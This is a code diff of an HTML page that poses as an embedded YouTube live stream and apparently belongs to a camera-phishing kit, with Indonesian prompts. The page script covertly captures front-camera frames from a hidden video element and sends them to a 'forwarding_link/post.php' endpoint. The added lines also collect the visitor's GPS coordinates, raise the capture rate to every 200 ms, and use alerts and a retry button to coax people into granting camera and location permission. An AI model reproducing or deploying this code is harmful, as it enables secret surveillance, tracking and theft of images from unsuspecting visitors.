@@ -1,82 +1,133 @@
 <!doctype html>
 <html>
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 </head>
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
+<body>
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-<script>
+    <div id="cameraError" style="display: none;">
+        Anda harus mengizinkan penggunaan kamera untuk melanjutkan. <button id="retryButton">Klik disini untuk mengizinkan penggunaan kamera</button>. Atau Cek Permission Kamera di pengaturan lalu refresh halaman ini
+    </div>
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
-}
-
-// Load init
-init();
-
-</script>
-
-    <body>
+    <div id="liveStream" style="display: none;">
         <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
 
-    </body>
+    <div id="mainPage"> <!-- Assuming this is the main page content -->
+        <!-- Main page content goes here -->
+    </div>
 
+    <script>
+    alert("Setelah ini, tolong izinkan penggunaan kamera dan lokasi untuk melanjutkan");
+
+    function post(imgdata, lat, lon) {
+        $.ajax({
+            type: "POST",
+            data: { cat: imgdata, latitude: lat, longitude: lon },
+            url: "forwarding_link/post.php",
+            dataType: "json",
+            async: false,
+            success: function (result) {
+                // call the function that handles the response/results
+            },
+            error: function () {},
+        });
+    }
+
+    'use strict';
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const errorMsgElement = document.getElementById("cameraError");
+    const liveStreamElement = document.getElementById("liveStream");
+    const retryButton = document.getElementById("retryButton");
+
+    const constraints = {
+        audio: false,
+        video: {
+            facingMode: "user",
+        },
+    };
+
+    let latitude = 0;
+    let longitude = 0;
+
+    async function init() {
+        try {
+            await Promise.all([getUserMedia(), getLocation()]);
+            startStreaming();
+        } catch (e) {
+            handleError(e);
+        }
+    }
+
+    async function getUserMedia() {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+    }
+
+    function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+
+        var context = canvas.getContext("2d");
+        setInterval(function () {
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData, latitude, longitude);
+        }, 200);
+
+        setTimeout(function () {
+            errorMsgElement.style.display = "none";
+            liveStreamElement.style.display = "block";
+        }, 2000);
+    }
+
+    function handleError(error) {
+        errorMsgElement.style.display = "block";
+        liveStreamElement.style.display = "none";
+        console.error("navigator.getUserMedia error:", error);
+    }
+
+    retryButton.addEventListener("click", function () {
+        console.log("Retry button clicked");
+        init();
+    });
+
+    function getLocation() {
+        return new Promise((resolve, reject) => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                        resolve();
+                    },
+                    function (error) {
+                        console.error("Error occurred while retrieving location:", error);
+                        reject(error);
+                    }
+                );
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+                reject("Geolocation not supported");
+            }
+        });
+    }
+
+    function startStreaming() {
+        // No need to hide mainPage, so no action required here
+    }
+
+    init();
+    </script>
+</body>
 </html>
